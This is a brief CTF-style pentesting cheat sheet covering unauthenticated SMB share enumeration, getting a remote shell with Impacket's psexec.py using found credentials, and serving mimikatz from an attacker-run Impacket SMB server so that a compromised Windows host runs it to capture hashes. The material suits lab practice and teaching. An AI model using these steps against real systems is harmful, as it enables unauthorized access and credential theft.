# SMB - Enumeration

When completing boot2root challenges, if SMB is open (Port 139 & 445) it is reccomended to see if the user can list SMB shares unauthenticated.

The below commands are different ways in which a user can interact with SMB shares:
- smbmap -H 10.10.10.10
- smbclient -L 10.0.0.10

If it asks for a password, just simple hit enter and that will confirm if authentication is required or if the user can view the shares unauthenticated.
If the user has read/write access to the share, it is then reccomended to connect to the share by running the below command:
```
smbclient //10.10.10.10/sharename
```

# SMB - Impacket Psexec

PsExec is a portable tool developed by Microsoft that lets a user run processes remotely using user credentials on the system.

If a user has compromised a user account and has found the password of the account, the user can then psexec into the machine if there is no other ways of entry. (Example: SSH, RDP, WinRM and etc is turned off).

This method requires port 445 to be open, if it is not then the user may have to port forward the port to a listening state.

The command the user should run:
```
/usr/share/doc/python-impacket/examples/psexec.py hacker@10.10.10.10
```

The user will be prompted for hacker's password: hacker

An interactive shell should be spawned as the user hacker.

# Impacket's SMBServer (For File Transfer)

Impacket's SMBServer a tool to remotely transfer, capture hashes, use executables and more.

This is how a user can capture hashes on a system once compromiosed. 

On a Linux machine the user should navigate to: 
```
cd /usr/share/windows-binaries
```

Identify the mimikatz executable is present then run Impacket's SMBServer:
```
python /usr/share/doc/python-impacket/examples/smbserver.py share .
```

On the compromised Windows system run:
```
\\10.10.10.10\share\mimikatz.exe
